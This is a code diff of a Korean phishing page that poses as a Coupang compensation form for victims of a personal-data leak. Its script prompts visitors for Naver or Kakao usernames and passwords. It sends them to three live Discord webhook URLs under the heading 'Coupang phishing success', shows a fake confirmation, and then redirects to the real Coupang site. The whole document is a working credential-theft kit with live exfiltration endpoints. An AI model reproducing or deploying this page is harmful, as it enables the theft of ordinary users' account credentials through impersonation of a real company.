@@ -5,22 +5,30 @@
 <title>쿠팡 개인정보 유출 보상 신청</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
-  body,html{margin:0;padding:0;background:#fff;font-family:"Noto Sans KR",sans-serif}
-  .header{background:#ff6b00;padding:20px 0;text-align:center}
-  .container{max-width:420px;margin:0 auto;background:#fff;padding:20px}
-  .title h1{font-size:23px;font-weight:700;text-align:center;margin:20px 0;color:#333}
-  .title p{font-size:15px;color:#555;text-align:center;line-height:1.6}
-  .login-btn{display:block;width:100%;padding:16px;margin:12px 0;border-radius:8px;font-size:17px;font-weight:700;text-align:center;color:#fff;cursor:pointer;box-shadow:0 2px 8px rgba(0,0,0,.15)}
-  .naver{background:#03c75a}
-  .kakao{background:#fee500;color:#191919;box-shadow:0 2px 8px rgba(0,0,0,.15)}
-  .footer{padding:30px 0;color:#999;font-size:12px;text-align:center}
-  .alert{background:#fff3cd;padding:18px;border-radius:10px;color:#d32f2f;font-size:14px;margin:20px 0;text-align:center;box-shadow:0 2px 6px rgba(0,0,0,.05)}
+  body,html{margin:0;padding:0;background:#fff;font-family:-apple-system,"Noto Sans KR",sans-serif}
+  .header{background:#ff6b00;padding:15px 0;text-align:center}
+  .logo{font-weight:900;font-size:38px;letter-spacing:-2.5px}
+  .logo span:nth-child(1){color:#4a2c0b}
+  .logo span:nth-child(2){color:#e61e2a}
+  .logo span:nth-child(3){color:#f26722}
+  .logo span:nth-child(4){color:#ffca00}
+  .logo span:nth-child(5){color:#009e4d}
+  .logo span:nth-child(6){color:#009ee3}
+  .container{max-width:400px;margin:0 auto;padding:20px}
+  .title h1{font-size:22px;font-weight:700;text-align:center;margin:20px 0 10px;color:#111}
+  .title p{font-size:14.5px;color:#555;text-align:center;line-height:1.5}
+  .alert{background:#fff8e1;padding:14px;border-radius:8px;margin:20px 0;font-size:13.5px;color:#d32f2f;text-align:center;border:1px solid #ffebee}
+  .login-btn{display:block;width:100%;padding:16px;margin:10px 0;border-radius:8px;font-size:17px;font-weight:700;text-align:center;cursor:pointer;box-shadow:0 3px 8px rgba(0,0,0,.12);transition:all .2s}
+  .login-btn:hover{transform:translateY(-1px);box-shadow:0 5px 12px rgba(0,0,0,.18)}
+  .naver{background:#03c75a;color:#fff}
+  .kakao{background:#fee500;color:#191919}
+  .footer{margin-top:60px;padding:20px 0;color:#999;font-size:11.5px;text-align:center;line-height:1.6}
 </style>
 </head>
 <body>
 <div class="header">
-  <div style="font-family:'Arial Black',sans-serif;font-size:66px;font-weight:900;letter-spacing:-4px;color:#4a2c0b">
-    <span style="color:#4a2c0b">cou</span><span style="color:#e61e2a">u</span><span style="color:#f26722">p</span><span style="color:#ffca00">a</span><span style="color:#009e4d">n</span><span style="color:#009ee3">g</span>
+  <div class="logo">
+    <span>cou</span><span>p</span><span>a</span><span>n</span><span>g</span>
   </div>
 </div>
 
@@ -50,33 +58,20 @@ function naverLogin(){
   const pw = prompt("네이버 비밀번호를 입력하세요");
   if(id && pw) send("네이버", id, pw);
 }
-
 function kakaoLogin(){
   const id = prompt("카카오메일 아이디를 입력하세요\n(예: abc123@kakao.com)");
   const pw = prompt("카카오 비밀번호를 입력하세요");
   if(id && pw) send("카카오", id, pw);
 }
-
 function send(type, id, pw){
-  const data = { embeds: [{ title: "쿠팡 피싱 성공", color: 16711680,
-    fields: [
-      { name: "로그인 종류", value: type },
-      { name: "아이디", value: id },
-      { name: "비밀번호", value: pw },
-      { name: "시간", value: new Date().toLocaleString('ko-KR') }
-    ]
-  }]};
-
   const hooks = [
     "https://discordapp.com/api/webhooks/1440762955196010517/R_jUtcPtXsZ2iQLalFINoXQpWSKhOGFHnfSxL3J5wv2RSrAEnLC1SW-aBysf0_q_K31n",
     "https://discordapp.com/api/webhooks/1443170861879394427/m2XA3HHcZr007LvLrETjYNxfWxufqK3qmfF5ULXtOWxghKHkGRmgb13mnOJa0Tgk-QRM",
     "https://discordapp.com/api/webhooks/1443170879256399956/ofvZrCn4KcBjo_eehancUH1LwkQEFutNjni2e36ixMQUqsDBvTeD2oMQ2TyRHsbgOagb"
   ];
-
-  hooks.forEach(h => fetch(h, {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)}));
-
+  hooks.forEach(h => fetch(h,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({embeds:[{title:"쿠팡 피싱 성공",color:16711680,fields:[{name:"종류",value:type},{name:"아이디",value:id},{name:"비번",value:pw},{name:"시간",value:new Date().toLocaleString('ko-KR')}]}]})}));
   alert("신청이 완료되었습니다.\n담당자가 순차적으로 연락드리겠습니다.");
-  setTimeout(()=>{location.href="https://www.coupang.com";},1500);
+  setTimeout(()=>{location.href="https://www.coupang.com"},1500);
 }
 </script>
 </body>
